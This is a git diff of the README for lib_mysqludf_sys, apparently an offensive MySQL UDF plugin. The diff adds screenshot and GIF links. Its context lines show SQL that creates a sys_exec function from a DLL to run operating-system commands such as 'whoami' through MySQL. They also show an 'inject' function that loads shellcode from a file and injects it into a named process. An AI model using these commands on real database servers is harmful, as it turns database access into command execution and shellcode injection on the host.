@@ -7,6 +7,9 @@ lib_mysqludf_sys is a udf plugin of MySQL.
 
 2.exec .sql file
 
+![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/exec_sql.png) 
+
+![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/dumpfile.png) 
 
 ## Sys_exec
 
@@ -15,6 +18,9 @@ select sys_exec("chcp 65001 & ipconfig");drop function sys_exec; ```
 
 2.``` create function sys_exec returns string soname "lib_mysqludf_sys_x64.dll"; 
 select sys_exec("whoami");drop function sys_exec; ```
+
+![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/sys_exec.png) 
+
 
 ## Inject
 
@@ -27,6 +33,12 @@ select sys_exec("whoami");drop function sys_exec; ```
 3.Inject shellcode
 
 ```create function inject returns string soname "lib_mysqludf_sys_x64.dll"; select inject(hex(load_file("C:\\raw.bin")),"AppVNice.exe");drop function inject;```
+
+![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/Inject_file.png) 
+
+4.Show Gif
+
+![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/injectshellcode.gif) 
 
 ## Download
 
